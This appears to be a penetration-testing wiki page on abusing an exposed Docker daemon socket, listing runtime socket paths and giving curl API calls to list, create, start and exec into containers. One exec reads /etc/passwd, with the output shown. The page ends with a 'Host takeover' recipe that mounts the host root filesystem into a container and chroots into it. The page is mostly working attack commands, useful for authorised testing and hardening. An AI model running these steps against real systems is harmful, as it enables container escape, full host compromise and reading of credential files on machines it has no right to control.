The Docker daemon can listen for [Docker Engine API](https://docs.docker.com/engine/api/) requests via three different types of socket:
- `unix`
- `tcp`
- `fd`

By default, Docker runs through a non-networked UNIX socket, which is created at `/var/run/docker.sock` and requires either root permission or docker group membership.

{% hint style="info" %}
Additionally, pay attention to the runtime sockets of other high-level runtimes:
- dockershim: `unix:///var/run/dockershim.sock`
- containerd: `unix:///run/containerd/containerd.sock`
- cri-o: `unix:///var/run/crio/crio.sock`
- frakti: `unix:///var/run/frakti.sock`
- rktlet: `unix:///var/run/rktlet.sock`
- ...
{% endhint %}

A `tcp` socket is used to remotely access the Docker daemon, for which the default setup provides un-encrypted and un-authenticated direct access. It is conventional to use port **2375** for un-encrypted, and port **2376** for encrypted communication with the daemon.

On Systemd-based systems, communication with the Docker daemon can occur over the Systemd socket `fd://`.

Sometimes the Docker daemon can be accessed inside the container or over the network. It is often leads to commands execution on the host system and escape from the container.

# List of all containers

`curl` command to list all containers on the host over `unix` socket.

```bash
$ curl -s --unix-socket /var/run/docker.sock http:/containers/json
```

`curl` command to list all containers on the host over `tcp` socket.

```bash
$ curl -s http://<host>:<port>/containers/json
```

# Create a container

`curl` command to create container over `unix` socket.

```bash
$ export CONTAINER_NAME=test-container
$ curl \
    -s \
    --unix-socket /var/run/docker.sock \
    "http:/containers/create?name=${CONTAINER_NAME}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{ "Image": "alpine:latest", "Cmd": [ "id" ] }'
```

`curl` command to create container over `tcp` socket.

```bash
$ export CONTAINER_NAME=test-container
$ curl \
    -s \
    "http://<host>:<port>/containers/create?name=${CONTAINER_NAME}" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{ "Image": "alpine:latest", "Cmd": [ "id" ] }'
```

# Start the container

```bash
$ export CONTAINER_NAME=test-container
$ curl \
    -s \
    "http://<host>:<port>/containers/${CONTAINER_NAME}/start" \
    -X POST \
    -H "Content-Type: application/json" 
```

# Code execution in a container

First you need to create an instance of `exec` that will run in the container.

```bash
$ curl \
    -s \
    "http://<host>:<port>/containers/<container_id>/exec" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}'

HTTP/1.1 201 Created
...

{"Id":"913c5ce2f3bc3e929166f2b402512a02c1669c03e515ef793513390ca1c3fdc3"}
```

Now that `exec` has been created, you need to run it.

```bash
$ export EXEC_ID=913c5ce2f3bc3e929166f2b402512a02c1669c03e515ef793513390ca1c3fdc3
$ curl \
    -s \
    "http://<host>:<port>/exec/${EXEC_ID}/start"
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"Detach": false,"Tty": false}' \

HTTP/1.1 200 OK
...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

# Host takeover

To execute commands on the host system, start the Docker container and mount the host root directory on the container volume.

1. Download ubuntu image.

    ```bash
    $ curl \
        -s \
        "http://<host>:<port>/images/create?fromImage=ubuntu&tag=latest" \
        -X POST \
        -H 'Content-Type: application/json'
    ```

2. Create a container.

    ```bash
    $ curl \
        -s \
        "http://<host>:<port>/containers/create"
        -X POST \
        -H "Content-Type: application/json" \
        -d '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "ubuntu","Volumes": {"/hostfs/": {}},"HostConfig": {"Binds": ["/:/hostfs"]}}'
    ```

3. Start the container.
4. In order to execute commands on the host system, change the root directory.

    ```bash
    $ chroot /hostfs
    ```

# References

- [Writeup: Microsoft Dynamics Container Sandbox RCE via Unauthenticated Docker Remote API 20,000$ Bounty](https://hencohen10.medium.com/microsoft-dynamics-container-sandbox-rce-via-unauthenticated-docker-remote-api-20-000-bounty-7f726340a93b)
- [Write up: Escaping the Cloud Shell container](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-introduction/)
- [Quarkslab's Blog: Why is Exposing the Docker Socket a Really Bad Idea?](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
